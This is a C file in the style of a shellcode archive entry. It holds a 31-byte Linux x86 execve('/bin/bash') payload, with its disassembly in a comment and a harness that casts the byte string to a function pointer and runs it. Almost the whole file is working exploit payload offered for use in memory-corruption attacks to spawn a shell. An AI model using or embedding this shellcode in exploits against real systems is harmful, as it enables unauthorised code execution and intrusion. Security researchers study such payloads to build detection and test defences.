/*
Title:    Linux x86 execve("/bin/bash") - 31 bytes
Author:   Amine Kanane <aminekanane_93@hotmail.com>
Desc:     Pop a /bin/bash Using The Stack

Disassembly of section .text:

08048060 <_start>:
 8048060:	31 c0                	xor    eax,eax
 8048062:	50                   	push   eax
 8048063:	68 62 61 73 68       	push   0x68736162
 8048068:	68 2f 2f 2f 2f       	push   0x2f2f2f2f
 804806d:	68 2f 62 69 6e       	push   0x6e69622f
 8048072:	89 e3                	mov    ebx,esp
 8048074:	50                   	push   eax
 8048075:	53                   	push   ebx
 8048076:	89 e1                	mov    ecx,esp
 8048078:	50                   	push   eax
 8048079:	89 e2                	mov    edx,esp
 804807b:	b0 0b                	mov    al,0xb
 804807d:	cd 80                	int    0x80

*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = "\x31\xc0\x50\x68\x62\x61\x73"
                       "\x68\x68\x2f\x2f\x2f\x2f\x68"
                       "\x2f\x62\x69\x6e\x89\xe3\x50"
                       "\x53\x89\xe1\x50\x89\xe2\xb0"
                       "\x0b\xcd\x80";
main()
{
	printf("Shellcode Length: %d\n", strlen(code));

	int (*ret)() = (int(*)())code;
	ret();
}
